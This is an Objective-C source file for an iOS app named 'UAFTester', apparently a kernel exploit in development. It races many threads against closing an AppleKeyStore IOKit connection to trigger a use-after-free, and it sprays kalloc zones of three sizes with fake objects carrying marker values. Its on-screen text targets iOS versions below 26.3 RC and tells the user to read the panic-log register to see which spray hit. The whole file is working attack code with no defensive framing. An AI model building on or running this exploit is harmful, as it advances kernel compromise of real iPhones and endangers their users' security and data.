//
//  ViewController.m
//  UAFTester
//
//  v9 MULTI-SIZE - Spray multiple object sizes to hit correct zone
//  Based on panic analysis: Wrong kalloc zone targeted!
//

#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   64
#define MAX_ATTEMPTS 500

// ========== MULTI-SIZE SPRAY STRATEGY ==========
#define SPRAY_COUNT_PER_SIZE  200    // Spray 200 of each size
#define NUM_SIZES             3      // Test 3 different sizes
// ==============================================

static atomic_int   g_phase  = 0;
static io_connect_t g_conn   = IO_OBJECT_NULL;
static atomic_uint  g_calls  = 0;
static atomic_uint  g_errors = 0;

// ========== MULTI-SIZE SPRAY GLOBALS ==========
static io_connect_t g_spray_conns_1024[SPRAY_COUNT_PER_SIZE];
static io_connect_t g_spray_conns_2048[SPRAY_COUNT_PER_SIZE];
static io_connect_t g_spray_conns_4096[SPRAY_COUNT_PER_SIZE];

static int g_spray_count_1024 = 0;
static int g_spray_count_2048 = 0;
static int g_spray_count_4096 = 0;
// ==============================================

// ========== MULTI-SIZE FAKE OBJECTS ==========

// 1024 bytes (kalloc.1024 zone)
typedef struct {
    uint64_t vtable;
    uint64_t lock;
    uint64_t refcount;
    uint64_t pad1[120];
    uint64_t target_at_0x110;     // Marker: 0x1111...
    uint64_t pad2[5];
} fake_gate_1024_t;  // = 1024 bytes

// 2048 bytes (kalloc.2048 zone) - Most likely!
typedef struct {
    uint64_t vtable;
    uint64_t lock;
    uint64_t refcount;
    uint64_t pad1[30];
    uint64_t target_at_0x110;     // Marker: 0x2222...
    uint64_t pad2[200];
} fake_gate_2048_t;  // = 2048 bytes

// 4096 bytes (kalloc.4096 zone)
typedef struct {
    uint64_t vtable;
    uint64_t lock;
    uint64_t refcount;
    uint64_t pad1[30];
    uint64_t target_at_0x110;     // Marker: 0x4444...
    uint64_t pad2[450];
} fake_gate_4096_t;  // = 4096 bytes

// ================================================

static void *racer_thread(void *arg) {
    (void)arg;
    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
        ;
    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
        uint64_t input[1] = {0};
        uint32_t out_cnt  = 0;
        kern_return_t kr = IOConnectCallMethod(
            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
            break;
        }
    }
    return NULL;
}

// ========== MULTI-SIZE SPRAY FUNCTIONS ==========

static int heap_spray_size(io_service_t svc, void(^log_callback)(NSString *), int size_bytes) {
    kern_return_t kr;
    int fail_count = 0;
    
    io_connect_t *conns = NULL;
    int *count = NULL;
    void *fake_object = NULL;
    size_t object_size = 0;
    uint64_t marker = 0;
    
    // Select appropriate structures based on size
    fake_gate_1024_t fake_1024;
    fake_gate_2048_t fake_2048;
    fake_gate_4096_t fake_4096;
    
    switch (size_bytes) {
        case 1024:
            conns = g_spray_conns_1024;
            count = &g_spray_count_1024;
            memset(&fake_1024, 0x41, sizeof(fake_1024));
            fake_1024.target_at_0x110 = 0x1111111111111111ULL;
            fake_object = &fake_1024;
            object_size = sizeof(fake_1024);
            marker = 0x1111111111111111ULL;
            break;
        case 2048:
            conns = g_spray_conns_2048;
            count = &g_spray_count_2048;
            memset(&fake_2048, 0x42, sizeof(fake_2048));
            fake_2048.target_at_0x110 = 0x2222222222222222ULL;
            fake_object = &fake_2048;
            object_size = sizeof(fake_2048);
            marker = 0x2222222222222222ULL;
            break;
        case 4096:
            conns = g_spray_conns_4096;
            count = &g_spray_count_4096;
            memset(&fake_4096, 0x44, sizeof(fake_4096));
            fake_4096.target_at_0x110 = 0x4444444444444444ULL;
            fake_object = &fake_4096;
            object_size = sizeof(fake_4096);
            marker = 0x4444444444444444ULL;
            break;
        default:
            return -1;
    }
    
    log_callback([NSString stringWithFormat:@"[SPRAY %d] Starting: %d objects", size_bytes, SPRAY_COUNT_PER_SIZE]);
    log_callback([NSString stringWithFormat:@"[SPRAY %d] Marker: 0x%llx", size_bytes, marker]);
    
    // Step 1: Open connections
    for (int i = 0; i < SPRAY_COUNT_PER_SIZE; i++) {
        kr = IOServiceOpen(svc, mach_task_self(), 0, &conns[i]);
        
        if (kr != KERN_SUCCESS) {
            if (kr == 0xe00002c7) {
                log_callback([NSString stringWithFormat:@"[SPRAY %d] Resource limit at %d", size_bytes, i]);
                *count = i;
                break;
            } else {
                fail_count++;
                if (fail_count > 5) {
                    *count = i - fail_count;
                    return -1;
                }
            }
            conns[i] = IO_OBJECT_NULL;
            continue;
        }
    }
    
    if (*count == 0) {
        *count = SPRAY_COUNT_PER_SIZE;
    }
    
    log_callback([NSString stringWithFormat:@"[SPRAY %d] Opened %d connections", size_bytes, *count]);
    
    if (*count < 20) {
        return -1;
    }
    
    // Step 2: Fill heap with fake objects
    int spray_success = 0;
    for (int i = 0; i < *count; i++) {
        if (conns[i] == IO_OBJECT_NULL) continue;
        
        kr = IOConnectCallMethod(
            conns[i],
            0,
            NULL, 0,
            fake_object,
            object_size,
            NULL, NULL,
            NULL, NULL
        );
        
        if (kr == KERN_SUCCESS || kr == kIOReturnUnsupported) {
            spray_success++;
        }
    }
    
    log_callback([NSString stringWithFormat:@"[SPRAY %d] Complete: %d/%d successful", 
                 size_bytes, spray_success, *count]);
    
    return 0;
}

static void heap_spray_cleanup_size(void(^log_callback)(NSString *), int size_bytes) {
    io_connect_t *conns = NULL;
    int *count = NULL;
    
    switch (size_bytes) {
        case 1024:
            conns = g_spray_conns_1024;
            count = &g_spray_count_1024;
            break;
        case 2048:
            conns = g_spray_conns_2048;
            count = &g_spray_count_2048;
            break;
        case 4096:
            conns = g_spray_conns_4096;
            count = &g_spray_count_4096;
            break;
        default:
            return;
    }
    
    if (*count > 0) {
        for (int i = 0; i < *count; i++) {
            if (conns[i] != MACH_PORT_NULL && conns[i] != IO_OBJECT_NULL) {
                IOServiceClose(conns[i]);
                mach_port_deallocate(mach_task_self(), conns[i]);
                conns[i] = MACH_PORT_NULL;
            }
        }
        log_callback([NSString stringWithFormat:@"[CLEANUP %d] Closed %d connections", size_bytes, *count]);
        *count = 0;
    }
}

// ==========================================

static int run_attempt(void) {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
    if (svc == IO_OBJECT_NULL)
        return -1;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL)
        return -1;

    atomic_store_explicit(&g_phase, 0, memory_order_release);
    atomic_store_explicit(&g_calls, 0, memory_order_relaxed);
    atomic_store_explicit(&g_errors, 0, memory_order_relaxed);

    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_create(&threads[i], NULL, racer_thread, NULL);

    atomic_store_explicit(&g_phase, 1, memory_order_release);
    usleep(100);

    IOServiceClose(g_conn);
    atomic_store_explicit(&g_phase, 2, memory_order_release);
    usleep(5000);

    atomic_store_explicit(&g_phase, 3, memory_order_release);
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_join(threads[i], NULL);

    mach_port_deallocate(mach_task_self(), g_conn);
    g_conn = IO_OBJECT_NULL;
    return 0;
}

@interface ViewController ()
@property (nonatomic, strong) UIButton   *triggerButton;
@property (nonatomic, strong) UILabel    *statusLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, assign) BOOL        running;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;
    [self buildUI];
}

- (void)buildUI {
    UILabel *title = [[UILabel alloc] init];
    title.text = @"AppleKeyStoreUserClient\nclose() UAF + HEAP SPRAY";
    title.font = [UIFont fontWithName:@"Menlo-Bold" size:18];
    title.textColor = UIColor.whiteColor;
    title.textAlignment = NSTextAlignmentCenter;
    title.numberOfLines = 2;
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    UILabel *subtitle = [[UILabel alloc] init];
    subtitle.text = @"v9 MULTI-SIZE: 1024+2048+4096 bytes\niOS <26.3 RC";
    subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
    subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
    subtitle.textAlignment = NSTextAlignmentCenter;
    subtitle.numberOfLines = 2;
    subtitle.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:subtitle];

    self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.triggerButton setTitle:@"TRIGGER UAF + SPRAY" forState:UIControlStateNormal];
    self.triggerButton.titleLabel.font = [UIFont fontWithName:@"Menlo-Bold" size:20];
    [self.triggerButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
    self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    self.triggerButton.layer.cornerRadius = 12;
    self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.triggerButton addTarget:self action:@selector(triggerTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.triggerButton];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"Ready";
    self.statusLabel.font = [UIFont fontWithName:@"Menlo" size:14];
    self.statusLabel.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusLabel];

    self.logView = [[UITextView alloc] init];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [title.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [title.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [subtitle.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:8],
        [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.triggerButton.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:24],
        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.triggerButton.widthAnchor constraintEqualToConstant:280],
        [self.triggerButton.heightAnchor constraintEqualToConstant:56],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.triggerButton.bottomAnchor constant:16],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
    ]];
}

- (void)appendLog:(NSString *)line {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", line];
        [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length - 1, 1)];
    });
}

- (void)setStatus:(NSString *)text color:(UIColor *)color {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
        self.statusLabel.textColor = color;
    });
}

- (void)triggerTapped {
    if (self.running) return;
    self.running = YES;
    self.logView.text = @"";
    self.triggerButton.enabled = NO;
    self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];

    [self appendLog:@"========================================"];
    [self appendLog:@"  UAF v9 MULTI-SIZE"];
    [self appendLog:@"========================================"];
    [self appendLog:@"[*] STRATEGY: Spray 3 different sizes"];
    [self appendLog:@"[*] Goal: Hit correct kalloc zone!"];
    [self appendLog:@"[*] Sizes: 1024, 2048, 4096 bytes"];
    [self appendLog:[NSString stringWithFormat:@"[*] Count: %d per size", SPRAY_COUNT_PER_SIZE]];
    [self appendLog:@""];
    [self setStatus:@"Initializing..." color:UIColor.yellowColor];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        io_service_t svc = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
        if (svc == IO_OBJECT_NULL) {
            [self appendLog:@"[-] AppleKeyStore service not found"];
            [self setStatus:@"Service not found" color:UIColor.redColor];
            [self finishRun];
            return;
        }
        [self appendLog:@"[+] AppleKeyStore service found"];
        [self appendLog:@""];
        
        // ========== PHASE 1: MULTI-SIZE HEAP SPRAY ==========
        [self appendLog:@">>> PHASE 1: MULTI-SIZE HEAP SPRAY"];
        [self setStatus:@"Spraying 1024 bytes..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
        
        // Spray 1024 bytes (kalloc.1024)
        int result = heap_spray_size(svc, ^(NSString *msg) {
            [self appendLog:msg];
        }, 1024);
        
        [self appendLog:@""];
        [self setStatus:@"Spraying 2048 bytes..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
        
        // Spray 2048 bytes (kalloc.2048) - Most likely!
        result = heap_spray_size(svc, ^(NSString *msg) {
            [self appendLog:msg];
        }, 2048);
        
        [self appendLog:@""];
        [self setStatus:@"Spraying 4096 bytes..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
        
        // Spray 4096 bytes (kalloc.4096)
        result = heap_spray_size(svc, ^(NSString *msg) {
            [self appendLog:msg];
        }, 4096);
        
        int total_objects = g_spray_count_1024 + g_spray_count_2048 + g_spray_count_4096;
        [self appendLog:@""];
        [self appendLog:[NSString stringWithFormat:@"[+] Total sprayed: %d objects", total_objects]];
        [self appendLog:[NSString stringWithFormat:@"    1024 bytes: %d", g_spray_count_1024]];
        [self appendLog:[NSString stringWithFormat:@"    2048 bytes: %d", g_spray_count_2048]];
        [self appendLog:[NSString stringWithFormat:@"    4096 bytes: %d", g_spray_count_4096]];
        [self appendLog:@""];
        
        usleep(100000); // 100ms settle time
        
        IOObjectRelease(svc);
        
        // ========== PHASE 2: UAF RACING ==========
        [self appendLog:@">>> PHASE 2: UAF RACING"];
        [self setStatus:@"Racing UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];

        for (int i = 0; i < MAX_ATTEMPTS; i++) {
            int result = run_attempt();
            
            if (result < 0) {
                usleep(5000);
            } else {
                usleep(500);
            }

            if ((i + 1) % 20 == 0 || i == 0) {
                [self appendLog:[NSString stringWithFormat:@"[%4d] calls=%u port_dead=%u",
                                 i + 1, atomic_load(&g_calls), atomic_load(&g_errors)]];
                [self setStatus:[NSString stringWithFormat:@"Racing %d/%d", i + 1, MAX_ATTEMPTS]
                          color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
            }
        }

        [self appendLog:@""];
        [self appendLog:@"========================================"];
        [self appendLog:@"  COMPLETED"];
        [self appendLog:@"========================================"];
        
        uint32_t final_calls = atomic_load(&g_calls);
        uint32_t final_errors = atomic_load(&g_errors);
        
        [self appendLog:[NSString stringWithFormat:@"[*] Total calls: %u", final_calls]];
        [self appendLog:[NSString stringWithFormat:@"[*] Port deaths: %u", final_errors]];
        
        if (final_errors > 0) {
            [self appendLog:@""];
            [self appendLog:@"✓✓✓ UAF TRIGGERED! ✓✓✓"];
            [self appendLog:@""];
            [self appendLog:@"CHECK PANIC LOG x16 REGISTER:"];
            [self appendLog:@"  0x1111111111111111 → 1024 bytes hit! ✓"];
            [self appendLog:@"  0x2222222222222222 → 2048 bytes hit! ✓✓ (likely!)"];
            [self appendLog:@"  0x4444444444444444 → 4096 bytes hit! ✓"];
            [self appendLog:@"  0x0020000000000000 → Still missed :("];
            [self setStatus:@"UAF TRIGGERED!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
        } else {
            [self appendLog:@"[*] No port deaths"];
            [self setStatus:@"Completed" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
        }
        
        // Cleanup
        [self appendLog:@""];
        heap_spray_cleanup_size(^(NSString *msg) { [self appendLog:msg]; }, 1024);
        heap_spray_cleanup_size(^(NSString *msg) { [self appendLog:msg]; }, 2048);
        heap_spray_cleanup_size(^(NSString *msg) { [self appendLog:msg]; }, 4096);
        
        [self finishRun];
    });
}

- (void)finishRun {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.running = NO;
        self.triggerButton.enabled = YES;
        self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    });
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

@end
